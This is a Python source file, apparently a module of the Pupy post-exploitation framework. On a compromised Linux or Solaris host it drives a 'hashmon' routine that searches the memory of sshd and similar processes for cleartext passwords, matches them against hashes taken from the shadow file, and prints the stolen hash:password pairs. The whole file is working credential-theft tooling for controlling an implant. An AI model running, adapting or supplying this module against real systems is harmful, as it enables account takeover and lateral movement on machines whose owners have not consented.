# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__='KeyloggerModule'

@config(cat='gather', compat=['linux', 'solaris'])
class KeyloggerModule(PupyModule):
    '''
        Try to find clear text passwords in memory
    '''
    unique_instance = True
    dependencies = {
        'linux': ['memorpy', 'hashmon'],
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='hashmon', description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-F', '--filter', default='.*/?(sshd)$', help='Regex to filter interesting process names')
        cls.arg_parser.add_argument(
            '-H', '--hashes', default='', help='Hashes to search (derive from shadow by default)')
        cls.arg_parser.add_argument('-p', '--poll', default=20, type=int, help='Poll interval (seconds)')
        cls.arg_parser.add_argument('-d', '--dups', default=131072, type=int,
                                         help='Amount of processed strings to store')
        cls.arg_parser.add_argument('-P', '--policy', default=True, help='Regex to check valid password')
        cls.arg_parser.add_argument('-m', '--min', default=8, type=int, help='Minimal password length')
        cls.arg_parser.add_argument('-M', '--max', default=20, type=int, help='Maximal password length')
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        start = self.client.remote('hashmon', 'start')
        stop = self.client.remote('hashmon', 'stop', False)
        dump = self.client.remote('hashmon', 'dump')

        if args.action == 'start':
            start(
                [x.strip() for x in args.filter.split(',')],
                hashes=args.hashes.split(),
                poll=args.poll,
                minpw=args.min, maxpw=args.max,
                maxdups=args.dups,
                policy=args.policy
            )
        elif args.action == 'dump':
            results = dump()
            if results is None:
                self.error('HashMon is not started')
            else:
                for password, hash in results:
                    self.success('{}:{}'.format(hash, password))

        elif args.action == 'stop':
            stop()
